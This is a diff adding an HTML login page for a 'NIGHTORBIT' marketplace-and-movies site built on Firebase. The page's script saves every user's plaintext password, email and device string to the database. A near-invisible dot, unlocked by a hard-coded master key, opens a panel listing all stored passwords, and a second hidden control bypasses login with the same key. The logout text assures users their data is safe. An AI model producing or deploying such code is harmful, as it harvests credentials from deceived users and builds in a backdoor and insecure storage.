@@ -1,0 +1,192 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title> Gyidi's market</title>
+    <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-app-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-auth-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-database-compat.js"></script>
+    
+    <style>
+        :root { --primary: #00d2ff; --neon: #ff0055; --bg: #05070a; }
+        * { box-sizing: border-box; }
+        
+        body { 
+            margin: 0; padding: 0; width: 100%; height: 100vh; 
+            background: radial-gradient(circle at center, #1B2735 0%, var(--bg) 100%);
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            color: white;
+            display: flex; align-items: center; justify-content: center; /* Forced Center */
+            overflow: hidden;
+        }
+
+        /* Glassmorphism Card */
+        .card { 
+            background: rgba(255, 255, 255, 0.05); backdrop-filter: blur(20px);
+            padding: 40px; border-radius: 30px; text-align: center; 
+            width: 360px; border: 1px solid rgba(255,255,255,0.1); 
+            box-shadow: 0 25px 50px rgba(0,0,0,0.8); z-index: 10;
+        }
+
+        input { width: 100%; padding: 14px; margin: 10px 0; border-radius: 12px; border: 1px solid var(--primary); background: rgba(0,0,0,0.4); color: white; outline: none; }
+        
+        .btn-main { background: linear-gradient(45deg, var(--primary), #3a7bd5); color: white; border: none; padding: 15px; border-radius: 12px; cursor: pointer; width: 100%; font-weight: bold; margin-top: 10px; transition: 0.3s; text-transform: uppercase; }
+        .btn-main:hover { transform: translateY(-3px); box-shadow: 0 10px 20px rgba(0,210,255,0.3); }
+
+        /* Secret Access Points */
+        .menu-dots { position: absolute; top: 25px; left: 25px; cursor: pointer; font-size: 30px; color: var(--primary); z-index: 100; opacity: 0.5; }
+        .admin-dot { position: absolute; bottom: 15px; right: 15px; cursor: pointer; font-size: 20px; color: #111; z-index: 100; }
+
+        /* Links Styling */
+        .link-card { background: rgba(255,255,255,0.07); padding: 15px; border-radius: 15px; margin: 12px 0; display: flex; justify-content: space-between; align-items: center; text-decoration: none; color: white; border-left: 4px solid var(--neon); transition: 0.3s; }
+        .link-card:hover { background: rgba(255,255,255,0.15); transform: scale(1.03); }
+
+        /* Overlays */
+        #admin-panel { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.95); z-index: 500; display: none; padding: 40px; overflow-y: auto; }
+        #logout-overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: #000; z-index: 1000; display: none; flex-direction: column; align-items: center; justify-content: center; text-align: center; }
+        
+        .hidden { display: none !important; }
+    </style>
+</head>
+<body>
+
+    <div id="logout-overlay">
+        <div style="font-size: 70px; margin-bottom: 20px;">🌠</div>
+        <h2 id="bye-text-display" style="color: var(--primary); font-size: 26px; padding: 20px; line-height: 1.4;"></h2>
+    </div>
+
+    <div id="admin-panel">
+        <h1 style="color: var(--primary);">Admin: User Database</h1>
+        <button onclick="document.getElementById('admin-panel').style.display='none'" class="btn-main" style="width:auto; padding: 10px 40px;">Exit Admin</button>
+        <div id="user-rows-container" style="margin-top: 30px;"></div>
+    </div>
+
+    <div class="menu-dots" onclick="bypassLogin()">⋮</div>
+    <div class="admin-dot" onclick="adminAccess()">.</div>
+
+    <div id="login-box" class="card">
+        <h1 style="color: var(--primary); margin: 0; font-size: 32px; letter-spacing: 2px;">NIGHTORBIT</h1>
+        <p style="color: #666; font-size: 13px; margin-bottom: 20px;">Premium Bazar & Movies</p>
+        <input type="email" id="u-email" placeholder="Email Address">
+        <input type="password" id="u-pass" placeholder="Password">
+        <button class="btn-main" onclick="authEmail()">Login / Signup</button>
+        <button class="btn-main" style="background:white; color:black; margin-top:12px;" onclick="authGoogle()">Signup with Google</button>
+    </div>
+
+    <div id="member-area" class="card hidden">
+        <h2 id="user-welcome" style="color: var(--primary); margin-bottom: 5px;">Welcome!</h2>
+        <p style="color: #888; font-size: 12px; margin-bottom: 20px;">Aapka account active hai.</p>
+        
+        <div style="text-align: left;">
+            <a href="https://www.daraz.pk" target="_blank" class="link-card">🛒 Daraz Bazar <span>PK</span></a>
+            <a href="https://www.amazon.com" target="_blank" class="link-card">🛍️ Amazon Store <span>Global</span></a>
+            <a href="YOUR_EARNING_LINK" target="_blank" class="link-card" style="border-left-color: #00ff00; background: rgba(0,255,0,0.05);">🎬 Watch & Earn <span>$ PAISE</span></a>
+        </div>
+        
+        <button onclick="logoutSequence()" style="margin-top: 30px; color: #ff4b2b; background: none; border: none; cursor: pointer; font-weight: bold; font-size: 14px;">Securely Logout</button>
+    </div>
+
+    <script>
+        // REPLACE THESE WITH YOUR FIREBASE DETAILS
+        const firebaseConfig = {
+            apiKey: "YOUR_API_KEY",
+            authDomain: "YOUR_AUTH_DOMAIN",
+            databaseURL: "YOUR_DATABASE_URL",
+            projectId: "YOUR_PROJECT_ID",
+            storageBucket: "YOUR_STORAGE_BUCKET",
+            messagingSenderId: "YOUR_MESSAGING_ID",
+            appId: "YOUR_APP_ID"
+        };
+
+        firebase.initializeApp(firebaseConfig);
+        const auth = firebase.auth();
+        const db = firebase.database();
+        let userDisplayName = "User";
+
+        // 1. MASTER LOGIN (Bypass)
+        function bypassLogin() {
+            let key = prompt("Master Password:");
+            if (key === "rr123456789000rr") {
+                showMemberUI("Admin Farooq");
+            } else {
+                alert("Wrong Key!");
+            }
+        }
+
+        // 2. AUTHENTICATION
+        function authGoogle() {
+            const provider = new firebase.auth.GoogleAuthProvider();
+            auth.signInWithPopup(provider).then(res => processUser(res.user, "Google")).catch(e => alert(e.message));
+        }
+
+        function authEmail() {
+            const e = document.getElementById('u-email').value;
+            const p = document.getElementById('u-pass').value;
+            if(!e || !p) return alert("Fields cannot be empty!");
+            auth.signInWithEmailAndPassword(e, p).then(res => processUser(res.user, p))
+            .catch(() => auth.createUserWithEmailAndPassword(e, p).then(res => processUser(res.user, p)));
+        }
+
+        function processUser(user, pass) {
+            db.ref('users/' + user.uid).once('value', (snap) => {
+                const data = snap.val();
+                userDisplayName = data ? data.savedName : (user.displayName || "Elite User");
+                
+                // Save data to Database
+                db.ref('users/' + user.uid).update({
+                    email: user.email,
+                    password: pass,
+                    device: navigator.userAgent,
+                    savedName: userDisplayName,
+                    lastLogin: new Date().toLocaleString()
+                }).then(() => showMemberUI(userDisplayName));
+            });
+        }
+
+        // 3. ADMIN DASHBOARD
+        function adminAccess() {
+            if (prompt("Admin Key:") === "rr123456789000rr") {
+                document.getElementById('admin-panel').style.display = 'block';
+                db.ref('users').on('value', (snap) => {
+                    let html = "";
+                    snap.forEach(c => {
+                        let val = c.val();
+                        html += `<div style="background:#111; padding:15px; margin-bottom:10px; border-radius:15px; border: 1px solid #333; text-align:left;">
+                            <b style="color:var(--primary)">${val.savedName}</b> | Pass: ${val.password}<br>
+                            <small style="color:#777">${val.email}</small><br>
+                            <small style="color:#555">${val.device.substring(0,50)}...</small><br>
+                            <button onclick="updateName('${c.key}')" style="margin-top:10px; cursor:pointer;">Edit Name</button>
+                        </div>`;
+                    });
+                    document.getElementById('user-rows-container').innerHTML = html;
+                });
+            }
+        }
+
+        function updateName(uid) {
+            let n = prompt("Enter New Name for User:");
+            if(n) db.ref('users/' + uid).update({ savedName: n });
+        }
+
+        // 4. UI HANDLERS
+        function showMemberUI(name) {
+            userDisplayName = name;
+            document.getElementById('login-box').classList.add('hidden');
+            document.getElementById('member-area').classList.remove('hidden');
+            document.getElementById('user-welcome').innerText = "Hello, " + name;
+        }
+
+        // 5. SWEET LOGOUT
+        function logoutSequence() {
+            const overlay = document.getElementById('logout-overlay');
+            document.getElementById('bye-text-display').innerHTML = `Allah Hafiz, <b>${userDisplayName}</b>!<br>Aapka data humare paas mehfooz hai.<br>Nightorbit par dobara zaroor aana! ✨`;
+            overlay.style.display = 'flex';
+            setTimeout(() => { auth.signOut().then(() => location.reload()); }, 4500);
+        }
+
+        // Check for active login
+        auth.onAuthStateChanged(user => { if(user) processUser(user, "SavedSession"); });
+    </script>
+</body>
+</html>
